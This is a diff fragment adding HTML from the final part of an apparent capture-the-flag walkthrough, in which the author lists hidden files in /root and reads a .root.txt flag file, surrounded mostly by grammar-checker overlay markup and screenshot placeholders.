+      ><pwa-container
+        data-uid="pwa_7F3C6-D291E-947FB-FCABA-B2"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+        ><pwa
+          data-pwa-id="8b6422ea-b061-4058-bd40-df473b9c3085"
+          data-pwa-hint="Unknown word: ls"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="as~us~is~s~la"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3335px; left: 375.021px; width: 15.1771px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="e3be8450-66c8-4b42-ad4b-1e5380eb36e6"
+          data-pwa-hint="Unknown word: ls"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="us~as~s~is~la"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 47.3335px; left: 237.74px; width: 15.1771px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      I navigate to the “/root” directory. Using&nbsp;<b>ls</b> doesn’t reveal
+      any files or directories, so I switch to&nbsp;<b>ls -la</b> to see any
+      hidden ones.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_9D4DB-B09F9-7DC70-B2A0B-78"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 433.271px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 433.271px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65d83a0-d521-11ef-a7f2-17531d96907d">
+      <img src="e65d83a0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 51 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_51BC5-CC2CD-07E00-CE647-A8"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="0cb53c04-6d1a-4e0d-9e65-20e9e7c0e61b"
+          data-pwa-hint="The punctuation mark '.' may require a space after it, not before. Consider moving the space."
+          data-pwa-heavy="false"
+          data-pwa-rule-id="WHITESPACE"
+          data-pwa-help-id="WHITESPACE"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions=". "
+          data-pwa-help-article-id="1000046"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3335px; left: 247.573px; width: 10.0312px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>For the last step, I open up .root.txt to capture the final flag.</p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_070F4-1FBEB-B7980-0F6F6-F5"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="8fb58a42-5809-4110-b72e-d8269fa5b532"
+          data-pwa-hint="The punctuation mark '.' may require a space after it, not before. Consider moving the space."
+          data-pwa-heavy="false"
+          data-pwa-rule-id="WHITESPACE"
+          data-pwa-help-id="WHITESPACE"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions=". "
+          data-pwa-help-article-id="1000046"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.333px; left: 38.3542px; width: 9.96875px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>cat .root.txt</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_CC954-122C3-991A9-BDEEE-B7"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 151.771px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 151.771px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65e9510-d521-11ef-a7f2-17531d96907d">
+      <img src="e65e9510-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 52 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_8AF13-6CF30-370C7-B1267-60"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; z-index: 1; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; z-index: 1; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p></p>
+  </body>
+</html>
